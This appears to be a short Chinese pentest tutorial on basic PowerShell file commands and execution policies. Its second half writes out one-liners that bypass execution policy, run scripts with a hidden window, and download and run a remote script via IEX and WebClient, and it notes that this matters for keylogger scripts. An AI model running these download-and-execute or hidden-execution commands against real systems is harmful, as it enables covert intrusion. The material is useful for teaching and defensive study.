# PowerShell基本命令和绕过权限执行

## 基本命令 

以文件操作为例

## 新建目录

```
New-Item whitecellclub-ItemType Directory
```

## 新建文件

```
New-Item light.txt-ItemType File
```

## 删除目录

```
Remove-Item whitecellclub
```

## 显示文件内容

```
Get-Content test.txt
```

## 设置文本内容

```
Set-Content test.txt-Value"Hello World!"
```

## 追加内容

```
Add-Content light.txt-Value"i love you"
```

## 清除内容

```
Clear-Content test.txt
```

## 执行策略

获取执行策略

```
Get-ExecutionPolicy
```

策略分以下几种：

- Restricted: 脚本不能执行(默认)
- RemoteSigned: 本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)。
- AllSigned: 仅当脚本由受信任的发布者签名时才能运行。
- Unrestricted: 允许所有的script运行

可以使用如下命令格式设置PowerShell的执行策略

```
Set-ExecutionPolicy <Policy name>
```

## 绕过策略来执行脚本

如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted,所以，在渗透时，需要采用一些方法绕过策略来执行脚本

## 绕过本地权限执行

上传xxx.ps1到目标服务器，在CMD环境下，在目标服务器本地执行该脚本

```
PowerShell.exe-ExecutionPolicy Bypass-File xxx.ps1
```

## 本地隐藏绕过权限执行脚本

```
PowerShell.exe-ExecutionPolicy Bypass-WindowStyle Hidden-NoLogo-NonInteractive-NoProfile-File xxx.ps1
```

## 用IEX下载远程PS1脚本绕过权限执行

```
PowerShell.exe-ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-Nonl IEX (New-ObjectNet.WebClient).DownloadString("xxx.ps1");[Parameters]
```

以上命令的参数说明：

- ExecutionPolicy Bypass : 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全规则。在渗透测试中，基本每一次运行PowerShell脚本时都要使用这个参数。
- WindowStyle Hidden ： 隐藏窗口
- NoLogo : 启动不显示版权标志的PowerShell
- NonInteractive (-Nonl) : 非交互模式，PowerShell不为用户提供交互的提示
- NoProfile (-Nop): PowerShell控制台不加载当前用户的配置文件
- Noexit : 执行后不退出Shell。这在使用键盘记录等脚本时非常重要。
- PowerShell脚本在默认情况下无法直接运行，这时就可以使用上述三种方法绕过安全策略，运行PowerShell脚本。